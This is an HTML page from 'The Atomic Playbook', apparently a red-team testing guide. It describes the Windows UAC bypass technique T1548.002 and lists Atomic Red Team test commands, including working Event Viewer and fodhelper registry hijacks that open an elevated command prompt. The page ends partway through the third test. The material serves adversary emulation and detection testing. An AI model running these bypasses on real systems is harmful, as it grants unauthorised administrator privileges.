

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta charset="utf-8" />
    <title>T1548.002 - Abuse Elevation Control Mechanism: Bypass User Access Control &#8212; The Atomic Playbook</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous">
    <link href="../../_static/css/index.css" rel="stylesheet">
    <link rel="stylesheet" href="../../_static/sphinx-book-theme.css" type="text/css" />
    <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
    <link rel="stylesheet" type="text/css" href="../../_static/togglebutton.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/copybutton.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/mystnb.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/sphinx-thebe.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/jupyter-sphinx.css" />
    <script id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
    <script src="../../_static/sphinx-book-theme.js"></script>
    <script src="../../_static/jquery.js"></script>
    <script src="../../_static/underscore.js"></script>
    <script src="../../_static/doctools.js"></script>
    <script src="../../_static/language_data.js"></script>
    <script src="../../_static/togglebutton.js"></script>
    <script src="../../_static/clipboard.min.js"></script>
    <script src="../../_static/copybutton.js"></script>
    <script src="../../_static/mystnb.js"></script>
    <script src="../../_static/sphinx-book-theme.js"></script>
    <script >var togglebuttonSelector = '.toggle, .admonition.dropdown, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/require.js/2.3.4/require.min.js"></script>
    <script src="https://unpkg.com/@jupyter-widgets/html-manager@^0.18.0/dist/embed-amd.js"></script>
    <script async="async" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
    <script async="async" src="https://unpkg.com/thebelab@latest/lib/index.js"></script>
    <script >
        const thebe_selector = ".thebe"
        const thebe_selector_input = "pre"
        const thebe_selector_output = ".output"
    </script>
    <script async="async" src="../../_static/sphinx-thebe.js"></script>
    <link rel="index" title="Index" href="../../genindex.html" />
    <link rel="search" title="Search" href="../../search.html" />
    <link rel="next" title="T1546.008 - Event Triggered Execution: Accessibility Features" href="T1546.008.html" />
    <link rel="prev" title="Privilege Escalation" href="../privilege-escalation.html" />

    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="docsearch:language" content="en">



  </head>
  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="80">
    

    <div class="container-xl">
      <div class="row">
          
<div class="col-12 col-md-3 bd-sidebar site-navigation show" id="site-navigation">
    
        <div class="navbar-brand-box">
<a class="navbar-brand text-wrap" href="../../index.html">
  
  <img src="../../_static/logo.png" class="logo" alt="logo">
  
  
  <h1 class="site-logo" id="site-title">The Atomic Playbook</h1>
  
</a>
</div>

<form class="bd-search d-flex align-items-center" action="../../search.html" method="get">
  <i class="icon fas fa-search"></i>
  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
</form>

<nav class="bd-links" id="bd-docs-nav" aria-label="Main navigation">
  <ul class="nav sidenav_l1">
 <li class="toctree-l1">
  <a class="reference internal" href="../../intro.html">
   Welcome to the Atomic Playbook
  </a>
 </li>
</ul>
<ul class="current nav sidenav_l1">
 <li class="toctree-l1">
  <a class="reference internal" href="../initial-access.html">
   Initial Access
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../execution.html">
   Execution
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../persistence.html">
   Persistence
  </a>
 </li>
 <li class="toctree-l1 current active">
  <a class="reference internal" href="../privilege-escalation.html">
   Privilege Escalation
  </a>
  <ul class="current">
   <li class="toctree-l2 current active">
    <a class="current reference internal" href="#">
     T1548.002 - Abuse Elevation Control Mechanism: Bypass User Access Control
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.008.html">
     T1546.008 - Event Triggered Execution: Accessibility Features
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.011.html">
     T1546.011 - Event Triggered Execution: Application Shimming
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1055.009.html">
     T1055.009 - Proc Memory
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.013.html">
     T1546.013 - Event Triggered Execution: PowerShell Profile
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1547.html">
     T1547 - Boot or Logon Autostart Execution
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1547.009.html">
     T1547.009 - Boot or Logon Autostart Execution: Shortcut Modification
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1055.012.html">
     T1055.012 - Process Injection: Process Hollowing
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1543.004.html">
     T1543.004 - Create or Modify System Process: Launch Daemon
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1547.010.html">
     T1547.010 - Port Monitors
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1574.012.html">
     T1574.012 - Hijack Execution Flow: COR_PROFILER
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1548.004.html">
     T1548.004 - Elevated Execution with Prompt
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1543.html">
     T1543 - Create or Modify System Process
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1037.html">
     T1037 - Boot or Logon Initialization Scripts
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1574.009.html">
     T1574.009 - Hijack Execution Flow: Path Interception by Unquoted Path
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.015.html">
     T1546.015 - Component Object Model Hijacking
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1543.002.html">
     T1543.002 - Create or Modify System Process: Systemd Service
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1574.010.html">
     T1574.010 - Hijack Execution Flow: Services File Permissions Weakness
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1055.014.html">
     T1055.014 - VDSO Hijacking
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1547.008.html">
     T1547.008 - LSASS Driver
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.html">
     T1546 - Event Triggered Execution
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.012.html">
     T1546.012 - Event Triggered Execution: Image File Execution Options Injection
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1547.011.html">
     T1547.011 - Boot or Logon Autostart Execution: Plist Modification
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1548.001.html">
     T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1053.html">
     T1053 - Scheduled Task/Job
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1055.013.html">
     T1055.013 - Process Doppelgänging
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.009.html">
     T1546.009 - AppCert DLLs
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1055.011.html">
     T1055.011 - Extra Window Memory Injection
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1134.html">
     T1134 - Access Token Manipulation
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1548.003.html">
     T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1055.008.html">
     T1055.008 - Ptrace System Calls
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.010.html">
     T1546.010 - Event Triggered Execution: AppInit DLLs
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.014.html">
     T1546.014 - Event Triggered Execution: Emond
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1034.html">
     T1034 - Path Interception
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1574.008.html">
     T1574.008 - Path Interception by Search Order Hijacking
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1574.011.html">
     T1574.011 - Hijack Execution Flow: Services Registry Permissions Weakness
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1068.html">
     T1068 - Exploitation for Privilege Escalation
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1055.html">
     T1055 - Process Injection
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1484.html">
     T1484 - Group Policy Modification
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1543.003.html">
     T1543.003 - Create or Modify System Process: Windows Service
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1543.001.html">
     T1543.001 - Create or Modify System Process: Launch Agent
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1055.002.html">
     T1055.002 - Portable Executable Injection
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1574.006.html">
     T1574.006 - Hijack Execution Flow: LD_PRELOAD
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1134.004.html">
     T1134.004 - Access Token Manipulation: Parent PID Spoofing
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1037.003.html">
     T1037.003 - Network Logon Script
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.003.html">
     T1546.003 - Event Triggered Execution: Windows Management Instrumentation Event Subscription
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1078.003.html">
     T1078.003 - Local Accounts
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1053.004.html">
     T1053.004 - Scheduled Task/Job: Launchd
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1078.001.html">
     T1078.001 - Valid Accounts: Default Accounts
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.001.html">
     T1546.001 - Event Triggered Execution: Change Default File Association
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1037.001.html">
     T1037.001 - Boot or Logon Initialization Scripts: Logon Script (Windows)
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1547.002.html">
     T1547.002 - Authentication Package
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1574.004.html">
     T1574.004 - Dylib Hijacking
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1547.006.html">
     T1547.006 - Boot or Logon Autostart Execution: Kernel Modules and Extensions
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1037.005.html">
     T1037.005 - Boot or Logon Initialization Scripts: Startup Items
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1548.html">
     T1548 - Abuse Elevation Control Mechanism
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1134.002.html">
     T1134.002 - Create Process with Token
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1055.004.html">
     T1055.004 - Process Injection: Asynchronous Procedure Call
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1053.002.html">
     T1053.002 - Scheduled Task/Job: At (Windows)
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.005.html">
     T1546.005 - Event Triggered Execution: Trap
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.007.html">
     T1546.007 - Event Triggered Execution: Netsh Helper DLL
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1574.002.html">
     T1574.002 - Hijack Execution Flow: DLL Side-Loading
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1547.004.html">
     T1547.004 - Boot or Logon Autostart Execution: Winlogon Helper DLL
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1055.001.html">
     T1055.001 - Dynamic-link Library Injection
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1574.005.html">
     T1574.005 - Executable Installer File Permissions Weakness
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1547.003.html">
     T1547.003 - Time Providers
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1547.001.html">
     T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1037.002.html">
     T1037.002 - Boot or Logon Initialization Scripts: Logon Script (Mac)
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1055.003.html">
     T1055.003 - Thread Execution Hijacking
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1574.007.html">
     T1574.007 - Path Interception by PATH Environment Variable
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1134.005.html">
     T1134.005 - SID-History Injection
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1053.005.html">
     T1053.005 - Scheduled Task/Job: Scheduled Task
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1078.002.html">
     T1078.002 - Domain Accounts
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.002.html">
     T1546.002 - Event Triggered Execution: Screensaver
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1053.001.html">
     T1053.001 - Scheduled Task/Job: At (Linux)
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.006.html">
     T1546.006 - LC_LOAD_DYLIB Addition
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1547.005.html">
     T1547.005 - Boot or Logon Autostart Execution: Security Support Provider
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1134.001.html">
     T1134.001 - Token Impersonation/Theft
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1078.html">
     T1078 - Valid Accounts
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1134.003.html">
     T1134.003 - Make and Impersonate Token
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1055.005.html">
     T1055.005 - Thread Local Storage
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1574.001.html">
     T1574.001 - Hijack Execution Flow: DLL Search Order Hijacking
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1547.007.html">
     T1547.007 - Boot or Logon Autostart Execution: Re-opened Applications
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1574.html">
     T1574 - Hijack Execution Flow
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1037.004.html">
     T1037.004 - Boot or Logon Initialization Scripts: Rc.common
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1546.004.html">
     T1546.004 - Event Triggered Execution: .bash_profile and .bashrc
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1078.004.html">
     T1078.004 - Cloud Accounts
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1053.003.html">
     T1053.003 - Scheduled Task/Job: Cron
    </a>
   </li>
  </ul>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../defense-evasion.html">
   Defense Evasion
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../credential-access.html">
   Credential Access
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../discovery.html">
   Discovery
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../lateral-movement.html">
   Lateral Movement
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../collection.html">
   Collection
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../command-and-control.html">
   Command and Control
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../exfiltration.html">
   Exfiltration
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../impact.html">
   Impact
  </a>
 </li>
</ul>

</nav>

 <!-- To handle the deprecated key -->

<div class="navbar_extra_footer">
  Powered by <a href="https://jupyterbook.org">Jupyter Book</a>
</div>

</div>


          


          
<main class="col py-md-3 pl-md-4 bd-content overflow-auto" role="main">
    
    <div class="row topbar fixed-top container-xl">
    <div class="col-12 col-md-3 bd-topbar-whitespace site-navigation show">
    </div>
    <div class="col pl-2 topbar-main">
        
        <button id="navbar-toggler" class="navbar-toggler ml-0" type="button" data-toggle="collapse"
            data-toggle="tooltip" data-placement="bottom" data-target=".site-navigation" aria-controls="navbar-menu"
            aria-expanded="true" aria-label="Toggle navigation" aria-controls="site-navigation"
            title="Toggle navigation" data-toggle="tooltip" data-placement="left">
            <i class="fas fa-bars"></i>
            <i class="fas fa-arrow-left"></i>
            <i class="fas fa-arrow-up"></i>
        </button>
        
        <div class="dropdown-buttons-trigger">
    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn" aria-label="Download this page"><i
            class="fas fa-download"></i></button>

    
    <div class="dropdown-buttons">
        <!-- ipynb file if we had a myst markdown file -->
        
        <!-- Download raw file -->
        <a class="dropdown-buttons" href="../../_sources/tactics/privilege-escalation/T1548.002.ipynb"><button type="button"
                class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
                data-placement="left">.ipynb</button></a>
        <!-- Download PDF via print -->
        <button type="button" id="download-print" class="btn btn-secondary topbarbtn" title="Print to PDF"
            onClick="window.print()" data-toggle="tooltip" data-placement="left">.pdf</button>
    </div>
    
</div>
        <!-- Source interaction buttons -->


        <!-- Full screen (wrap in <a> to have style consistency -->
        <a class="full-screen-button"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip"
                data-placement="bottom" onclick="toggleFullScreen()" title="Fullscreen mode"><i
                    class="fas fa-expand"></i></button></a>

        <!-- Launch buttons -->

    </div>

    <!-- Table of contents -->
    <div class="d-none d-md-block col-md-2 bd-toc show">
        <div class="tocsection onthispage pt-5 pb-3">
            <i class="fas fa-list"></i> Contents
        </div>
        <nav id="bd-toc-nav">
            <ul class="nav section-nav flex-column">
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#atomic-tests">
   Atomic Tests
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#atomic-test-1-bypass-uac-using-event-viewer-cmd">
     Atomic Test #1 - Bypass UAC using Event Viewer (cmd)
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#attack-commands-run-with-command-prompt">
       Attack Commands: Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         command_prompt
        </span>
       </code>
      </a>
     </li>
    </ul>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#atomic-test-2-bypass-uac-using-event-viewer-powershell">
     Atomic Test #2 - Bypass UAC using Event Viewer (PowerShell)
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#attack-commands-run-with-powershell">
       Attack Commands: Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         powershell
        </span>
       </code>
      </a>
     </li>
    </ul>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#atomic-test-3-bypass-uac-using-fodhelper">
     Atomic Test #3 - Bypass UAC using Fodhelper
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#id1">
       Attack Commands: Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         command_prompt
        </span>
       </code>
      </a>
     </li>
    </ul>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#atomic-test-4-bypass-uac-using-fodhelper-powershell">
     Atomic Test #4 - Bypass UAC using Fodhelper - PowerShell
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#id2">
       Attack Commands: Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         powershell
        </span>
       </code>
      </a>
     </li>
    </ul>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#atomic-test-5-bypass-uac-using-computerdefaults-powershell">
     Atomic Test #5 - Bypass UAC using ComputerDefaults (PowerShell)
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#id3">
       Attack Commands: Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         powershell
        </span>
       </code>
      </a>
     </li>
    </ul>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#atomic-test-6-bypass-uac-by-mocking-trusted-directories">
     Atomic Test #6 - Bypass UAC by Mocking Trusted Directories
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#id4">
       Attack Commands: Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         command_prompt
        </span>
       </code>
      </a>
     </li>
    </ul>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#atomic-test-7-bypass-uac-using-sdclt-delegateexecute">
     Atomic Test #7 - Bypass UAC using sdclt DelegateExecute
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#id5">
       Attack Commands: Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         powershell
        </span>
       </code>
      </a>
     </li>
    </ul>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#detection">
   Detection
  </a>
 </li>
</ul>

        </nav>
    </div>
</div>
    <div id="main-content" class="row">
        <div class="col-12 col-md-9 pl-md-3 pr-md-0">
        
              <div>
                
  <div class="section" id="t1548-002-abuse-elevation-control-mechanism-bypass-user-access-control">
<h1>T1548.002 - Abuse Elevation Control Mechanism: Bypass User Access Control<a class="headerlink" href="#t1548-002-abuse-elevation-control-mechanism-bypass-user-access-control" title="Permalink to this headline">¶</a></h1>
<p>Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. (Citation: TechNet How UAC Works)</p>
<p>If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated <a class="reference external" href="https://attack.mitre.org/techniques/T1559/001">Component Object Model</a> objects without prompting the user through the UAC notification box. (Citation: TechNet Inside UAC) (Citation: MSDN COM Elevation) An example of this is use of <a class="reference external" href="https://attack.mitre.org/techniques/T1218/011">Rundll32</a> to load a specifically crafted DLL which loads an auto-elevated <a class="reference external" href="https://attack.mitre.org/techniques/T1559/001">Component Object Model</a> object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)</p>
<p>Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:</p>
<ul class="simple">
<li><p><code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)</p></li>
</ul>
<p>Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)</p>
<div class="section" id="atomic-tests">
<h2>Atomic Tests<a class="headerlink" href="#atomic-tests" title="Permalink to this headline">¶</a></h2>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#Import the Module before running the tests.</span>
<span class="c1"># Checkout Jupyter Notebook at https://github.com/haresudhan/TheAtomicPlaybook to run PS scripts.</span>
<span class="n">Import</span><span class="o">-</span><span class="n">Module</span> <span class="o">/</span><span class="n">Users</span><span class="o">/</span><span class="mh">0x6c</span><span class="o">/</span><span class="n">AtomicRedTeam</span><span class="o">/</span><span class="n">atomics</span><span class="o">/</span><span class="n">invoke</span><span class="o">-</span><span class="n">atomicredteam</span><span class="o">/</span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicRedTeam</span><span class="o">.</span><span class="n">psd1</span> <span class="o">-</span> <span class="n">Force</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="atomic-test-1-bypass-uac-using-event-viewer-cmd">
<h3>Atomic Test #1 - Bypass UAC using Event Viewer (cmd)<a class="headerlink" href="#atomic-test-1-bypass-uac-using-event-viewer-cmd" title="Permalink to this headline">¶</a></h3>
<p>Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
Upon execution command prompt should be launched with administrative privelages</p>
<p><strong>Supported Platforms:</strong> windows</p>
<div class="section" id="attack-commands-run-with-command-prompt">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d &quot;C:\Windows\System32\cmd.exe&quot; /f
cmd.exe /c eventvwr.msc
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1548</span><span class="o">.</span><span class="mi">002</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">1</span>
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="atomic-test-2-bypass-uac-using-event-viewer-powershell">
<h3>Atomic Test #2 - Bypass UAC using Event Viewer (PowerShell)<a class="headerlink" href="#atomic-test-2-bypass-uac-using-event-viewer-powershell" title="Permalink to this headline">¶</a></h3>
<p>PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
Upon execution command prompt should be launched with administrative privelages</p>
<p><strong>Supported Platforms:</strong> windows</p>
<div class="section" id="attack-commands-run-with-powershell">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="s2">&quot;HKCU:\software\classes\mscfile\shell\open\command&quot;</span> <span class="n">-Force</span>
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKCU:\software\classes\mscfile\shell\open\command&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;(default)&quot;</span> <span class="n">-Value</span> <span class="s2">&quot;C:\Windows\System32\cmd.exe&quot;</span> <span class="n">-Force</span>
<span class="nb">Start-Process</span> <span class="s2">&quot;C:\Windows\System32\eventvwr.msc&quot;</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1548</span><span class="o">.</span><span class="mi">002</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">2</span>
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="atomic-test-3-bypass-uac-using-fodhelper">
<h3>Atomic Test #3 - Bypass UAC using Fodhelper<a class="headerlink" href="#atomic-test-3-bypass-uac-using-fodhelper" title="Permalink to this headline">¶</a></h3>
<p>Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
Upon execution, “The operation completed successfully.” will be shown twice and command prompt will be opened.</p>
<p><strong>Supported Platforms:</strong> windows</p>
<div class="section" id="id1">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d &quot;C:\Windows\System32\cmd.exe&quot; /f
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v &quot;DelegateExecute&quot; /f
fodhelper.exe
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1548</span><span class="o">.</span><span class="mi">002</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">3</span>
